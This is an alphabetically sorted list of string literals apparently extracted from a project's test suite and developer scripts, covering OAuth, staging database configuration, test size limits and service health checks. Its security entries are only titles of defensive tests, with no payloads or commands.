    "Simulate OAuth authentication flow",
    "Simulate a long-running background database operation.",
    "Simulate complete login flow and return tokens",
    "Simulate how the FastAPI app would process security scan requests.",
    "Simulate security validation operations that depend on database.",
    "Simulate tests without real connections",
    "Simulate user authentication and return tokens",
    "Simulated failure",
    "Simulates asyncpg connection.",
    "Simulates pre-deployment validation.",
    "Simulating hanging database connection during disposal",
    "Size violations addressed:",
    "Skip environment setup (use existing environment variables)",
    "Skipped:",
    "Skipping",
    "Slow tests that may take longer to complete",
    "Socket closure error not handled gracefully:",
    "Socket connection already closed",
    "Socket error during cleanup not handled:",
    "Socket reset",
    "Some tests failed - see details above",
    "Some tests failed. Check the output above.",
    "Specific files to check (default: all test files)",
    "Specific module to test (e.g., netra_backend.app.services)",
    "Specific test files or directories",
    "Specific test files or directories to run",
    "Specific test files or patterns to run",
    "Split",
    "Split '",
    "Split from",
    "Split into",
    "Split into multiple focused test functions or extract helper methods",
    "Split large test files into smaller, focused test modules",
    "Split large test functions into smaller, focused tests",
    "Splitting",
    "Splitting suggestions for",
    "Splitting suggestions:",
    "StAgInG",
    "Staging",
    "Staging Configuration Test",
    "Staging Environment",
    "Staging Environment Test Script\nVerifies that the staging environment is properly configured and all components are communicating",
    "Staging OAuth redirect URI incorrect!\nExpected:",
    "Staging OAuth redirect URI should use auth.staging.netrasystems.ai:",
    "Staging SSL Configuration",
    "Staging URL contains placeholder password",
    "Staging auth service URL incorrect:",
    "Staging auth service URL should not use localhost:",
    "Staging auth service URL should use HTTPS:",
    "Staging environment health check failed",
    "Staging environment not available",
    "Staging environment not available for testing",
    "Staging environment not reachable",
    "Staging environment specific tests",
    "Staging frontend URL incorrect:",
    "Staging must not use 'none' algorithm (security vulnerability)",
    "Staging password is too short",
    "Staging password must be at least 8 characters",
    "Staging should have limited degradation but got:",
    "Staging should not allow dev login",
    "Staging should not allow mock auth",
    "Staging should not use dev service ID, got:",
    "Staging should not use localhost for database host",
    "Staging should not use long development expiry, got:",
    "Staging should use secure JWT algorithm, got:",
    "Staging tokens should have 15-minute expiry, got:",
    "Staging uses auth.staging.netrasystems.ai",
    "StagingDatabaseValidator failed to detect credential issue:",
    "StagingDatabaseValidator should detect problematic 'user_pr-4' pattern",
    "Standalone Tests",
    "Standard pytest",
    "Standard rename failed:",
    "Start all services using dev launcher.",
    "Start test services for frontend real service testing",
    "Start test services for frontend real service testing.\n\nThis script manages Docker containers and local services needed for\nrunning frontend tests against real backend services.",
    "Start the development server.",
    "Starting",
    "Starting 100 test iterations...",
    "Starting Docker services...",
    "Starting E2E test import fixing...",
    "Starting WebSocket DEV MODE functional tests...",
    "Starting Workflow Status Verification Tests",
    "Starting automated test fix loop...",
    "Starting comprehensive fake test scan...",
    "Starting comprehensive test import fix...",
    "Starting database test...",
    "Starting development server...",
    "Starting local backend services...",
    "Starting long-running database operation",
    "Starting optimized execution of",
    "Starting optimized test execution...",
    "Starting service coordination fix validation",
    "Starting services for E2E tests...",
    "Starting test import alignment...",
    "Starting test overlap analysis for",
    "Starting with",
    "Starting with 1 DB issues in",
    "Startup OAuth validation failed with valid staging config:",
    "Startup Test Executor\nHandles execution of backend, frontend, and E2E tests",
    "Startup Timing",
    "Startup should find valid Google Client ID in staging",
    "Startup should find valid Google Client Secret in staging",
    "Startup took",
    "State collision detected:",
    "State parameter should be generated",
    "State parameter too short:",
    "State parameters must be cryptographically unique",
    "State parameters should be single-use to prevent replay attacks",
    "State should be bound to specific session",
    "State should be single-use:",
    "State should be stored successfully",
    "State should be stored with session binding",
    "State should be valid with memory store",
    "State should contain HMAC separator",
    "State should validate once:",
    "State should validate with correct session",
    "State validation failed for",
    "State validation failed:",
    "Static Assets",
    "Static assets are being served",
    "Static assets returned status",
    "Static assets test failed:",
    "Status",
    "Status:",
    "Stderr:",
    "Stdout:",
    "Step 1: Running smoke, unit, and critical tests...",
    "Step 2: Attempting to fix:",
    "Stop auth service completely to simulate it being down",
    "Stop on first test failure",
    "Stopping development server...",
    "Stopping execution:",
    "Strategies:",
    "Stress tests with high load or concurrency",
    "Strict mode - fail on any violations",
    "Success Rate:",
    "Success Rate: N/A",
    "Success rate too low:",
    "Success rate:",
    "Successful renames:",
    "Successful test runs:",
    "Successfully fixed:",
    "Suggested refactoring strategies:",
    "Suggested splitting strategies:",
    "Suggestion: Extract helper methods or split test logic",
    "Suggestion: Focus on core unit tests that test business logic",
    "Suite Breakdown:",
    "Summary:",
    "Supports",
    "Sync URL has SSL:",
    "Sync URL:",
    "Syntax error in",
    "Syntax error:",
    "Syntax errors fixed:",
    "Syntax fixes applied:",
    "SyntaxError",
    "System Startup Test Runner\nModular test runner for system startup and E2E tests\nLegacy entry point - redirects to new modular implementation",
    "System path disclosed: '",
    "System paths detected in response",
    "System should be healthy despite degraded services",
    "TCP",
    "TCP Async SSL URL:",
    "TCP Async URL:",
    "TCP Configuration",
    "TCP Sync SSL URL:",
    "TCP Sync URL:",
    "TCP URL with ssl for psycopg2 conversion",
    "TCP URL with sslmode for asyncpg conversion",
    "TCP config available:",
    "TCP connection mode",
    "TCP staging URL (should have SSL parameters)",
    "TEST ALIGNMENT SUMMARY",
    "TEST CATEGORIES & COUNTS",
    "TEST COMPLIANCE REPORT",
    "TEST EXECUTION SUMMARY",
    "TEST FILE SIZE VIOLATIONS (",
    "TEST FUNCTION VIOLATIONS (",
    "TEST LIMITS VIOLATIONS REPORT",
    "TEST MAPPING TO ORIGINAL ISSUES:",
    "TEST OVERLAP ANALYSIS COMPLETE",
    "TEST PROCESS CLEANUP",
    "TEST RESULTS",
    "TEST RESULTS:",
    "TEST SIZE COMPLIANCE REPORT",
    "TEST SIZE FIXING SUMMARY",
    "TEST SIZE LIMITS ENFORCEMENT SYSTEM DEMONSTRATION",
    "TEST STUB DETECTION REPORT",
    "TEST SUMMARY",
    "TEST TYPE SUMMARY",
    "TESTING",
    "TESTING ALEMBIC CONFIGURATION",
    "TESTING AUTH DATABASE ENGINE CREATION",
    "TESTING AUTH DATABASE SESSION LIFECYCLE",
    "TESTING AUTH DATABASE STAGING INTEGRATION",
    "TESTING AUTH DATABASE URL CONVERSION",
    "TESTING AUTH DATABASE URL VALIDATION",
    "TESTING AUTH SERVICE DATABASE MANAGER IMPORT",
    "TESTING CLOUD SQL CONFIGURATION",
    "TESTING CONNECTION POOLING URL SCENARIOS",
    "TESTING DATABASE MIGRATION COMMANDS",
    "TESTING DRIVER URL FORMATTING",
    "TESTING MIGRATION SAFETY CHECKS",
    "TESTING MIGRATION URL GENERATION",
    "TESTING MODULE:",
    "TESTING SSL CERTIFICATE VALIDATION",
    "TESTING SSL PARAMETER HANDLING",
    "TESTING SSL PARAMETER HANDLING IN URLs",
    "TESTING STAGING DATABASE CONNECTION",
    "TESTING STAGING SSL CONFIGURATION WITH REAL SECRETS",
    "TESTING TCP CONFIGURATION",
    "TESTING URL DRIVER COMPATIBILITY FOR SSL",
    "TESTING VALIDATION EDGE CASES",
    "TESTING | Service startup orchestration...",
    "TEST_DATABASE_URL",
    "TEST_DIRECTORIES = {\n    \"unit\": [\"netra_backend/tests/unit\"],\n    \"integration\": [\"netra_backend/tests/integration\"],\n    \"e2e\": [\"netra_backend/tests/e2e\"],\n    \"agents\": [\"netra_backend/tests/agents\"],\n    \"critical\": [\"netra_backend/tests/critical\"],\n    \"routes\": [\"netra_backend/tests/routes\"],\n    \"services\": [\"netra_backend/tests/services\"],\n    \"database\": [\"netra_backend/tests/database\"],\n    \"websocket\": [\"netra_backend/tests/websocket\"],\n    \"auth\": [\"netra_backend/tests/auth_integration\"],\n    \"performance\": [\"netra_backend/tests/performance\"],\n    \"security\": [\"netra_backend/tests/security\"],\n    \"mcp\": [\"netra_backend/tests/mcp\"],\n    \"utils\": [\"netra_backend/tests/utils\"],\n    \"validation\": [\"netra_backend/tests/validation\"],\n    \"config\": [\"netra_backend/tests/config\"],\n    \"startup\": [\"netra_backend/tests/startup\"],\n    \"llm\": [\"netra_backend/tests/llm\"],\n    \"core\": [\"netra_backend/tests/core\"],\n    \"unified_system\": [\"netra_backend/tests/unified_system\"],\n    \"test_framework\": [\"test_framework/tests\"]\n}",
    "TEST_DIRECTORIES\\s*=\\s*\\{[^}]+\\}",
    "TEST_ENV",
    "TEST_MODE",
    "TEST_ORGANIZATION_AUDIT.md",
    "TEST_UTILS IMPORT FIX RESULTS",
    "TIER COVERAGE:",
    "TIMEOUT",
    "TIMEOUT: Alembic command timed out",
    "TOKEN_CREATED",
    "TOKEN_REFRESHED",
    "TOKEN_REVOKED",
    "TOP OPTIMIZATION RECOMMENDATIONS",
    "TOP VALUE TESTS:",
    "TOTAL:",
    "TRACEBACK:",
    "Table creation correctly failed due to postgres database error:",
    "Tables created in transaction",
    "Tables found after transaction:",
    "Tables found in transaction:",
    "Target:",
    "Technology stack detected:",
    "Test",
    "Test 10: Expired ID token",
    "Test 11: Missing email in OAuth provider response",
    "Test 12: Unverified email address from OAuth provider",
    "Test 13: Blocked email domain (spam/disposable)",
    "Test 14: Distributed tracing context propagation across services (L3)",
    "Test 15: Circuit breaker activation on repeated OAuth provider failures (L3)",
    "Test 16: Network connection failure to OAuth provider",
    "Test 17: Database connection failure during user creation",
    "Test 18: Redis session storage failure",
    "Test 19: Race condition in duplicate user creation",
    "Test 1: Basic successful OAuth login flow - THE DEFAULT CASE\n        This MUST work in production but is designed to initially fail.",
    "Test 20: JWT token validation and structure (L3)",
    "Test 21: WebSocket authentication token validation (L3)",
    "Test 22: CORS failure for cross-origin OAuth requests",
    "Test 23: Redirect URI mismatch attack prevention",
    "Test 24: Token injection attack prevention",
    "Test 25: Session fixation attack prevention",
    "Test 26: Extremely long email address handling",
    "Test 27: Unicode and special characters in user name",
    "Test 28: Null values in OAuth provider response",
    "Test 29: Concurrent login attempts from same user",
    "Test 2: PKCE code challenge verification failure (L3)",
    "Test 30: Token refresh while session is actively being used",
    "Test 3: OAuth nonce replay attack prevention (L3 with mock Redis)",
    "Test 4: OAuth code reuse attack prevention",
    "Test 5: CSRF token binding to session failure (L3)",
    "Test 6: HMAC signature verification failure on state parameter (L3)",
    "Test 7: Expired state parameter (>10 minutes)",
    "Test 8: Malformed ID token from OAuth provider",
    "Test 9: Invalid JWT signature in ID token",
    "Test Agent Initialization - Verify robust startup mechanisms\n\nSimple test to validate that the agent initialization improvements work correctly.\nTests fallback mechanisms, error handling, and graceful degradation.",
    "Test Auth Service Database Authentication Failures\nTests that replicate the database authentication issues found in production logs.\n\nCRITICAL AUTHENTICATION ISSUES TO REPLICATE:\n1. \"password authentication failed for user 'user_pr-4'\" \n2. \"password authentication failed for user 'postgres'\"\n3. Table creation skipped due to authentication errors\n4. Socket closure issues during shutdown\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent database authentication failures in production\n- Value Impact: Ensures auth service can connect with proper credentials\n- Strategic Impact: Prevents authentication service downtime affecting all customers",
    "Test Auth Service Database Connection Validation\nTests the actual database connection mechanism and table creation process.\n\nCRITICAL VALIDATION ISSUES TO REPLICATE:\n1. Database connection validation bypassed during initialization\n2. Table creation failing silently when authentication is invalid\n3. Health checks failing due to credential inconsistencies \n4. Connection pool exhaustion during authentication retries\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Ensure reliable database connectivity validation\n- Value Impact: Prevents silent failures and improves error detection\n- Strategic Impact: Reduces production downtime and improves service reliability",
    "Test Auth Service Database Manager\nVerifies that the auth service database manager properly handles URL transformations\nand SSL parameter conversions according to the learnings.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and stability\n- Value Impact: Prevents database connection failures in production\n- Strategic Impact: Ensures auth service can operate independently",
    "Test Auth Service Graceful Shutdown Failures\nTests that replicate shutdown timeout and socket closure issues.\n\nCRITICAL SHUTDOWN ISSUES TO REPLICATE:\n1. \"Shutdown timeout exceeded\" warnings during service termination\n2. Socket closure errors during cleanup operations  \n3. Connection pool not properly disposed during shutdown\n4. Background tasks not properly cancelled during auth failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Ensure graceful service shutdown and resource cleanup\n- Value Impact: Prevents resource leaks and improves service reliability\n- Strategic Impact: Enables proper service lifecycle management in production",
    "Test Auth Service Integration",
    "Test Auth Service Integration\nVerifies that the auth service is properly integrated with backend and frontend",
    "Test Auth Service Staging Database Credentials\nTests that validate database credential configuration for staging environment.\n\nCRITICAL VALIDATION FOR STAGING:\n1. Correct database credentials are loaded from environment\n2. Staging-specific DATABASE_URL format is valid  \n3. Cloud SQL proxy configuration compatibility\n4. Credential validation before deployment\n5. No invalid user patterns like 'user_pr-4'\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Prevent staging deployment failures due to credential issues\n- Value Impact: Ensures auth service can connect to staging database successfully  \n- Strategic Impact: Prevents auth service downtime that affects all customer authentication",
    "Test Auth service with the ACTUAL staging credentials from Secret Manager.\nThis test validates the exact configuration that would be used in production.",
    "Test AuthConfig database URL generation.",
    "Test AuthDatabase proper initialization with validation.",
    "Test CORS configuration",
    "Test CORS validation.",
    "Test CSRF protection for state-changing operations",
    "Test Client for Auth Service\nHTTP test client with authentication helpers for testing auth endpoints.\nProvides convenient methods for auth operations and request handling.",
    "Test Cloud SQL URL handling in auth service\nEnsures proper handling of Cloud SQL Unix socket format",
    "Test Compliance Checker\nEnsures test files follow the same quality standards as production code:\n- Maximum 300 lines per file\n- Maximum 8 lines per function\n- No mock component implementations inside test files",
    "Test Configuration:",
    "Test Environment Configuration\nManages environment variables and configuration for auth service tests.\nEnsures test isolation and proper cleanup of environment state.",
    "Test File Size Violations (>300 lines):",
    "Test Fixer Examples:",
    "Test Fixer for Real Test Requirements\n\nProvides automated and semi-automated fixes for test requirement violations.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity\n- Value Impact: Automates compliance with real test requirements\n- Strategic Impact: Reduces manual fix effort and prevents regressions",
    "Test Function Violations (>8 lines):",
    "Test Helper Functions\nUtility functions for auth service testing operations.\nProvides common functionality for test setup, data creation, and assertions.",
    "Test JSON output format",
    "Test JWT token format validation",
    "Test JWT token generation with correct secret.",
    "Test Limits Examples - See function docstrings for splitting strategies",
    "Test Limits Violation Examples and Fixes\nDemonstrates how to fix common test limit violations according to SPEC/testing.xml",
    "Test Mixins for Auth Service\nReusable test functionality as mixins for specific concerns.\nEach mixin provides focused functionality following single responsibility.",
    "Test OAuth PKCE Token Refresh Flow\nTests the critical OAuth 2.1 PKCE token refresh process - currently missing from test coverage",
    "Test OAuth authentication flow",
    "Test OAuth configuration endpoint",
    "Test OAuth flow locally with enhanced debugging",
    "Test OAuth login initiation",
    "Test OAuth provider failover in staging environment",
    "Test OAuth security manager falls back to memory when Redis unavailable",
    "Test OAuth state management works during Redis failover",
    "Test Overlap Analyzer\nAnalyzes test files for similarity and potential duplication using vector similarity techniques.",
    "Test PostgreSQL compliance for auth service\nVerifies all PostgreSQL learnings are properly implemented\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensure robust database connections and configuration\n- Strategic Impact: Prevent database-related auth failures in production",
    "Test Process Cleanup Utility\nCleans up hanging Node.js and Python test processes on Windows",
    "Test Quality Report (Report Only)",
    "Test Redis connection health monitoring and reconnection",
    "Test Redis connection recovery after becoming available",
    "Test Redis session synchronization with database cleanup",
    "Test Report Analyzer - Analyzes test reports and identifies issues.",
    "Test Results:",
    "Test Runner for Example Message Flow System\n\nComprehensive test runner for the example message flow implementation\nwith detailed reporting and validation.\n\nBusiness Value: Ensures reliability of AI optimization demonstration system",
    "Test SQL injection attempts are logged",
    "Test SQL injection attempts in login endpoint",
    "Test SQL injection in service token endpoint",
    "Test SQL injection in token validation",
    "Test SSL certificate handling for staging database connections.",
    "Test Settings Configuration\nCentralized test configuration and settings management.\nProvides type-safe configuration for different test scenarios.",
    "Test Size Violations Analysis and Reporting Script\n\n!!!! CRITICAL WARNING !!!!\nThis script is designed ONLY for analysis and reporting of test size violations.\nThe auto-fix capabilities are DISABLED by default and should ONLY be used:\n1. In dry-run mode for planning manual refactoring\n2. With explicit human review before any actual changes\n3. After backing up all affected files\n4. With immediate test validation after any changes\n\nNEVER use auto-fix in production code without thorough review!\n\nCapabilities:\n1. ANALYZE test files for size violations (SAFE)\n2. REPORT violations and suggest improvements (SAFE)\n3. DRY-RUN mode to preview potential changes (SAFE)\n4. ACTUAL fixes require explicit opt-in and multiple confirmations (DANGEROUS)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Code Quality Analysis and Reporting\n- Value Impact: Identifies technical debt for manual remediation\n- Strategic/Revenue Impact: Provides metrics for prioritizing refactoring efforts",
    "Test Staging Startup Sequence\nTests the complete startup sequence for staging deployment.\nValidates service initialization order, dependencies, and configuration.",
    "Test Stub Detection and Removal Script\n\nThis script automatically detects test stubs, mock implementations, and placeholder\ncode in production files according to the SPEC/no_test_stubs.xml specification.\n\nUsage:\n    python scripts/remove_test_stubs.py --scan          # Scan for test stubs\n    python scripts/remove_test_stubs.py --fix           # Fix detected stubs\n    python scripts/remove_test_stubs.py --report        # Generate detailed report",
    "Test Stub Detection and Removal Tool",
    "Test Summary",
    "Test TCP connection as fallback (should fail from local).",
    "Test URL normalization handles all PostgreSQL URL formats.",
    "Test URL:",
    "Test User",
    "Test Violations Reporter - Focus specifically on test file and function violations\nGenerates detailed reports with splitting suggestions for test limit violations.",
    "Test WebSocket configuration endpoint.",
    "Test WebSocket connection and functionality.",
    "Test WebSocket connection.",
    "Test WebSocket connectivity",
    "Test WebSocket health endpoint.",
    "Test XSS prevention in OAuth callback parameters",
    "Test XSS prevention in User-Agent header",
    "Test XSS prevention in login inputs",
    "Test a single endpoint",
    "Test agent",
    "Test alignment complete!",
    "Test all imports (comprehensive, slower)",
    "Test assertion failed",
    "Test async PostgreSQL connections for both backend and auth services\n\nThis script verifies that the new async-only PostgreSQL configuration\nworks correctly in local development environment.",
    "Test async auth operations work.",
    "Test auth service API endpoints",
    "Test auth service database connection",
    "Test auth service database connection and session management.",
    "Test auth service database connection during tests.\n\nThis test verifies that the auth service properly uses SQLite during pytest execution\nand doesn't incorrectly try to connect to PostgreSQL.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Test Infrastructure Reliability\n- Value Impact: Ensures auth tests run correctly in isolated environments\n- Strategic Impact: Enables reliable CI/CD and development workflows",
    "Test auth service database session management and DatabaseURLBuilder integration.",
    "Test auth service health endpoint",
    "Test authentication flow.",
    "Test automatic session expiry via validate_session",
    "Test backend auth client integration",
    "Test backend service database connection",
    "Test basic WebSocket connection to the backend.",
    "Test basic service startup orchestration.",
    "Test behavior when Redis connection pool is exhausted",
    "Test behavior when Redis is explicitly disabled",
    "Test behavior when database operations are denied due to permissions.\n        \n        Should handle permission errors gracefully.",
    "Test case",
    "Test category to run",
    "Test checking specific workflow run ID",
    "Test classes:",
    "Test cleanup job handles database errors gracefully",
    "Test cleanup job handles large number of sessions",
    "Test cleanup of expired sessions",
    "Test cleanup of inactive sessions",
    "Test cleanup preserves most recent sessions",
    "Test complete OAuth flow across all three services in staging",
    "Test complete connection lifecycle with events.",
    "Test complete end-to-end coordination workflow.",
    "Test complete token flow from creation to validation.",
    "Test completed successfully!",
    "Test comprehensive attack scenario",
    "Test comprehensive audit logging",
    "Test concurrent database initialization attempts.\n        \n        EXPECTED FAILURE: May fail with race conditions or constraint violations.",
    "Test concurrent operations during Redis failover",
    "Test config file not found:",
    "Test configuration loading for staging environment.",
    "Test configuration loading with detailed logging for debugging staging issues.",
    "Test connection event handlers are properly configured.",
    "Test connection retry with exponential backoff.",
    "Test connection using AuthConfig generated URL.",
    "Test coverage calculation module.\n\nCalculates test coverage metrics and trends.\nFollows 450-line limit with 25-line function limit.",
    "Test coverage metrics calculator.\n\nCalculates test coverage and related metrics.\nFollows 450-line limit with 25-line function limit.",
    "Test crashed:",
    "Test database connection with individual secrets.",
    "Test database initialization and table creation",
    "Test database initialization when schema is partially present.\n        \n        EXPECTED FAILURE: May not handle partial schema states properly.",
    "Test database migrations against staging database.",
    "Test direct asyncpg connection using staging credentials.",
    "Test discovery file not found:",
    "Test distribution by top-level directory:",
    "Test email format validation",
    "Test enforcement of maximum sessions per user",
    "Test execution error:",
    "Test execution failed:",
    "Test execution interrupted by user",
    "Test execution timed out",
    "Test failed",
    "Test failed login attempts are logged",
    "Test failed:",
    "Test file",
    "Test file and function limits compliance checker.\nEnforces SPEC/testing.xml rules: test files MUST follow same 450-line limit as production code,\ntest functions MUST follow same 25-line limit as production code.",
    "Test file exceeds",
    "Test file not found:",
    "Test file to analyze",
    "Test file to validate",
    "Test files:",
    "Test function '",
    "Test functions:",
    "Test graceful degradation when Redis is unavailable",
    "Test graceful degradation with optional service failures.",
    "Test handling multiple sessions for same user",
    "Test handling of Redis connection timeouts",
    "Test health endpoints for all services",
    "Test if Cloud SQL connector can be imported",
    "Test initialization when database constraints already exist.\n        \n        EXPECTED FAILURE: May try to create duplicate constraints.",
    "Test initialization with invalid database URL.\n        \n        Should fail gracefully with clear error message.",
    "Test interrupted by user",
    "Test level to run",
    "Test logout of all user sessions",
    "Test main API endpoints",
    "Test message for validation",
    "Test module split from original file",
    "Test multiple concurrent database initialization attempts.\n        \n        EXPECTED FAILURE: Race conditions may cause constraint violations.",
    "Test only runs in staging environment",
    "Test passed",
    "Test password length validation",
    "Test pool monitoring and warning patterns.",
    "Test port allocation prevents conflicts.",
    "Test prevention of HTTP method override attacks",
    "Test prevention of token injection attacks",
    "Test processes running:",
    "Test proper resource cleanup.",
    "Test protection against concurrent async attempts",
    "Test protection against large payload attacks",
    "Test rate limiting on login attempts",
    "Test rate limiting on token validation",
    "Test receiving model response via WebSocket.",
    "Test recovery from interrupted database initialization.\n        \n        EXPECTED FAILURE: May not handle partial initialization states properly.",
    "Test recovery when only some tables were created successfully.\n        \n        EXPECTED FAILURE: May not handle missing tables properly.",
    "Test refactoring helper",
    "Test refactoring helper for splitting large test files.\n\nThis helper analyzes large test files and suggests intelligent splits based on:\n- Test categories (unit, integration, e2e)\n- Functionality being tested\n- Test classes and groupings\n- Dependencies between tests\n\nFeatures:\n- Analyzes large test files and suggests splits\n- Groups related tests for extraction\n- Maintains test dependencies when splitting\n- Generates new file names following conventions\n- Preserves imports and test utilities",
    "Test refresh attempt on expired session",
    "Test refreshing active session before expiry",
    "Test report saved to: workflow_verification_test_report.md",
    "Test run timed out",
    "Test runner to validate service coordination fixes.\n\nThis script runs the coordination system tests to ensure all issues\nidentified in test_critical_cold_start_initialization.py are resolved.",
    "Test running database initialization multiple times in sequence.\n        \n        EXPECTED FAILURE: May fail with constraint violations.",
    "Test script for staging error monitor logic validation.\n\nThis script tests the error threshold and decision logic without requiring GCP access.",
    "Test script for verify_workflow_status.py\n\nDemonstrates usage patterns and validates the script functionality.",
    "Test script to debug Auth service database connection with staging credentials.\n\nThis script tests the database connection locally using the exact same configuration\nas the Auth service would use in staging environment.",
    "Test script to verify environment detection is working correctly.\nRun this to ensure all environment detection logic defaults to staging, not production.",
    "Test security headers are set properly",
    "Test security middleware using canonical SSOT implementation",
    "Test sending a chat message.",
    "Test separation between readiness and health checks.",
    "Test service discovery handles timing issues.",
    "Test session created successfully!",
    "Test session data is isolated per session",
    "Test sessions are isolated between users",
    "Test size limits validator",
    "Test splitting strategy (default: hybrid)",
    "Test staging configuration after simplification.\nVerifies that staging will load secrets from Google Secret Manager only.",
    "Test staging environment",
    "Test staging startup sequence",
    "Test successful Redis connection when Redis is available",
    "Test suite for verify_workflow_status.py\n\nTests various scenarios and documents the verification results.",
    "Test table output format",
    "Test that Cloud SQL Unix socket URLs are handled correctly",
    "Test that Heroku-style postgres:// URLs are handled correctly",
    "Test that PostgreSQL URLs with sslmode are converted correctly",
    "Test that SQLAlchemy create_all is idempotent.\n        \n        EXPECTED FAILURE: May not handle existing objects gracefully.",
    "Test that auth database connection fails without SSL configuration.",
    "Test that auth routes don't attempt to sync to a separate database",
    "Test that auth service can create tables in SQLite.",
    "Test that auth service initializes only one database connection",
    "Test that auth service uses DATABASE_URL from environment",
    "Test that auth service uses SQLite for database connections during tests.",
    "Test that connection.py calls the correct database URL method.",
    "Test that custom database types can be created idempotently.\n        \n        EXPECTED FAILURE: May try to create types that already exist.",
    "Test that database can recover from interrupted initialization.\n        \n        EXPECTED FAILURE: May not handle interrupted states properly.",
    "Test that database connection pool can recover from exhaustion.\n        \n        May fail if connection pool management is not robust.",
    "Test that database initialization can be run multiple times without errors.\n        \n        EXPECTED FAILURE: Currently raises UniqueViolationError on repeated initialization.\n        Staging logs show warnings about duplicate constraint violations during startup.",
    "Test that dependency resolution prevents early startup.",
    "Test that failed initialization attempts don't leave database in bad state.\n        \n        EXPECTED FAILURE: May leave partial objects that interfere with retry.",
    "Test that indexes can be created multiple times without errors.\n        \n        EXPECTED FAILURE: May try to create duplicate indexes.",
    "Test that main_db_sync module does not exist (removed duplicate)",
    "Test that memory store provides proper isolation between instances",
    "Test that regular PostgreSQL URLs are handled correctly",
    "Test that schema creation commands are idempotent.\n        \n        EXPECTED FAILURE: May try to create schemas that already exist.",
    "Test that table creation handles existing tables gracefully.\n        \n        EXPECTED FAILURE: May raise errors when tables already exist.",
    "Test that user creation maintains database integrity.",
    "Test the AgentInitializationManager.",
    "Test the enhanced agent registry.",
    "Test the init_database.py script can be run multiple times safely.\n        \n        EXPECTED FAILURE: Currently may raise UniqueViolationError on repeated runs.",
    "Test the modular DataSubAgent.",
    "Test timed out",
    "Test to ensure auth service uses only ONE database connection\nPrevents regression of duplicate database connection issue",
    "Test token generation with mock user",
    "Test token validation",
    "Test token validation between services",
    "Test utilities and helper functions",
    "Test validation error - frontend callback mismatch",
    "Test validation error - frontend callback should be in prohibited list",
    "Test validation of expired session",
    "Test validation of valid session",
    "Test with no assertions",
    "Test1!",
    "TestClient/1.0",
    "TestPassword123!",
    "Tested shell command pattern:",
    "Testing AgentInitializationManager...",
    "Testing OAuth config:",
    "Testing URL:",
    "Testing WebSocket connection...",
    "Testing against:",
    "Testing all modules in netra_backend.app...",
    "Testing complete coordination workflow",
    "Testing configuration loading...",
    "Testing critical error deployment scenario...",
    "Testing dependency resolution fixes",
    "Testing dependency resolution...",
    "Testing enhanced agent registry...",
    "Testing error categorization...",
    "Testing graceful degradation",
    "Testing handler initialization...",
    "Testing health endpoints...",
    "Testing help command...",
    "Testing initialization...",
    "Testing message validation...",
    "Testing missing parameters...",
    "Testing missing token...",
    "Testing modular DataSubAgent...",
    "Testing normal deployment scenario...",
    "Testing port allocation coordination",
    "Testing pre-run size validation...",
    "Testing readiness vs health check separation",
    "Testing resource cleanup",
    "Testing secret access...",
    "Testing service discovery timing fixes",
    "Testing service initialization order...",
    "Testing startup timing...",
    "Testing valid URL:",
    "Testing:",
    "Tests - Split from",
    "Tests Executed:",
    "Tests Failed:",
    "Tests Passed:",
    "Tests completed!",
    "Tests in excluded directories:",
    "Tests marked as consistently failing",
    "Tests needing implementation:",
    "Tests passed:",
    "Tests requiring real database connections",
    "Tests requiring real external services",
    "Tests that all Five Whys fixes work together in staging environment.",
    "Tests that may fail intermittently",
    "Tests that use real LLM services",
    "Tests timed out after",
    "Tests using only mocks",
    "The Auth service database connection issue is likely caused by:",
    "The Auth service should be able to connect to staging database",
    "The current configuration shows potential for improvement in the following areas:",
    "The issue is likely with the actual database connection in Cloud Run",
    "The service coordination system should now handle:",
    "The system analysis reveals the following insights:",
    "These files exceed 450-line limit and should be split:",
    "These files should be fixed manually before attempting any refactoring.",
    "These files will be skipped to avoid overwrites.",
    "These functions exceed 25-line limit and need helper extraction:",
    "These integration tests use excessive mocking:",
    "These test pairs appear to be exact duplicates and should be consolidated:",
    "These test pairs are highly similar and might benefit from refactoring:",
    "Third database initialization should also succeed (idempotent)",
    "This breaks OAuth flow - Google will never call auth service",
    "This demo shows Fix #2: Test Size Limits Enforcement implementation",
    "This file causes precedence issues with Google Secret Manager",
    "This might be expected if not running on GCP or without proxy",
    "This pattern uses frontend URL for OAuth redirect_uri\nFix: Change _determine_urls()[1] to _determine_urls()[0]",
    "This report identifies test files that violate size constraints.",
    "This should work if running on GCP or with Cloud SQL proxy",
    "This validates fixes for issues in test_critical_cold_start_initialization.py",
    "This would contain:\n- All user creation tests\n- All authentication tests  \n- All permission tests\n- All user profile tests\n- Helper functions",
    "This would require careful AST manipulation",
    "Timeout",
    "Timeout '",
    "Timeout during test",
    "Timeout during validation",
    "Timeout in",
    "Timestamp:",
    "Timing difference too large:",
    "To execute the renames, run: python",
    "To fix import errors:",
    "To limit to first N files: python",
    "To restore: cp -r {backup_dir}/* {root_dir}/",
    "To run all integration tests:",
    "To run frontend tests with real services:",
    "To run real e2e tests:",
    "Token",
    "Token (first 20 chars): [cyan]",
